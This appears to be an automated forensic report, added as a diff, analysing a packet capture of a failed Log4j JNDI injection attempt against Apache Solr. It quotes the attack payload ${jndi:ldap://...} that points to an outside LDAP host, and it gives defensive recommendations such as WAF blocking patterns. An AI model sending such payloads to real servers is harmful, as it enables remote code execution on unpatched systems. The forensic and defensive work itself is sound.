@@ -1,0 +1,57 @@
+=== FRA FORENSIC REPORT ===
+
+PCAP File: incident.pcap
+
+=== FLOW SUMMARY ===
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 1
+TCP Stream IDs: 0
+Protocol Counts: ICMPv6=2, ARP=2, TCP=8, HTTP=1, DNS=8, HTTP/JSON=1
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:51346           <-> 172.18.0.2:8983                  4 1025 bytes       6 720 bytes      10 1745 bytes   120.751736000         0.6533
+================================================================================
+
+
+=== Flow Analysis ===
+
+--- Stream 0 [VALID] ---
+Service: Apache Solr
+Relevant Events:
+- [E-S0000-F000008-004] GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}
+- [E-S0000-F000012-010] root user keyword observed
+- [E-S0000-F000012-009] HTTP Status 400
+Exploit Indicators:
+- [E-S0000-F000008-004] ${jndi:ldap://8qvsbr.sdasda1212.cn}
+Malicious Activities: None
+Attack Success: Failed
+Evidence Keywords: jndi, ldap, Solr, 400, admin, root
+
+=== FINAL REPORT ===
+Affected Service: Apache Solr
+Identified CVE: Not Found
+Attack: Failed
+Is Service Vulnerable: Unknown
+Evidence:
+- PCAP [E-S0000-F000008-004]: HTTP GET to /solr/admin/cores with action parameter containing ${jndi:ldap://8qvsbr.sdasda1212.cn}, indicating a Log4j JNDI injection attempt.
+- PCAP [E-S0000-F000012-009]: Server responded with HTTP 400 to the injection attempt, suggesting the payload was rejected.
+- PCAP [E-S0000-F000012-010]: 'root' keyword observed in traffic; no direct link to successful exploitation established.
+
+Verification Summary:
+- Confirmed the attempted JNDI/LDAP injection in the Solr admin endpoint request (PCAP ID: E-S0000-F000008-004).
+- Observed HTTP 400 response from the server to the malicious request, indicating failure to process the payload (PCAP ID: E-S0000-F000012-009).
+
+Defensive Recommendation:
+- Ensure all Log4j components used by Solr and its JVM are updated to a non-vulnerable version (e.g., 2.17.x or vendor-recommended) and remove outdated JndiLookup classes where applicable.
+- Upgrade Apache Solr to the latest supported release and apply all relevant security patches and configuration hardening guides.
+- Restrict access to Solr admin and core management endpoints (e.g., /solr/admin) via network ACLs, authentication/authorization, and reverse proxy controls.
+- Deploy input validation and WAF rules to block patterns like ${jndi: and other known injection payloads targeting Java logging.
+- Disable unnecessary Solr features and handlers, and enforce authenticated/authorized ConfigSet uploads to reduce RCE exposure.
+- Enable comprehensive logging and alerting for abnormal admin requests and 4xx/5xx spikes, and monitor for outbound LDAP/RMI/HTTP callbacks from Solr hosts.
